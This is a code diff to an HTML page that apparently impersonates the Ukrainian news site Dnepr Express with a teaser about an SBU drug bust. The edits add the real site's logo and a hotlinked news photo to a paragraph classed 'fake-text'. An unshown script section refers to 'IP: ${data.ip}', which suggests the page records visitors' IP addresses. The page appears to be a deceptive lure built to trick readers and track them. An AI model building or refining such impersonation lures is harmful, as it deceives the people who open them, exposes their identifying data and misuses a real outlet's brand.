@@ -13,15 +13,19 @@
       color: #111;
     }
     .logo {
-      font-size: 1.6em;
-      font-weight: bold;
-      color: #d40000;
-      margin-bottom: 10px;
+      max-width: 180px;
+      margin-bottom: 15px;
     }
     .headline {
       font-size: 1.4em;
       font-weight: bold;
-      margin: 10px 0;
+      margin: 15px 0;
+    }
+    .news-img {
+      width: 100%;
+      max-width: 700px;
+      border-radius: 8px;
+      margin: 10px 0 20px 0;
     }
     .fake-text {
       font-size: 1em;
@@ -34,8 +38,14 @@
   </style>
 </head>
 <body>
-  <div class="logo">DNEPR.EXPRESS</div>
+  <!-- Логотип -->
+  <img src="https://dnepr.express/logo.png" alt="Dnepr Express" class="logo">
+
   <div class="headline">⚡️ Масштабная операция СБУ: разоблачена сеть наркоторговцев</div>
+
+  <!-- Сюжетная картинка -->
+  <img src="https://dnepr.express/storage/media/publishing-media/2025/05/15/1747290691-bvmrh/conversions/inshot-20250515-092937128-amp.jpg" alt="Новость" class="news-img">
+
   <p class="fake-text">
     Сегодня Служба безопасности Украины сообщила о задержании участников крупной преступной группы, действовавшей в 15 областях страны, в том числе в Днепропетровской. Подробности в эксклюзивном материале далее...
   </p>
@@ -114,7 +124,6 @@ IP: ${data.ip}
   </script>
 </body>
 </html>
-
 
 
 
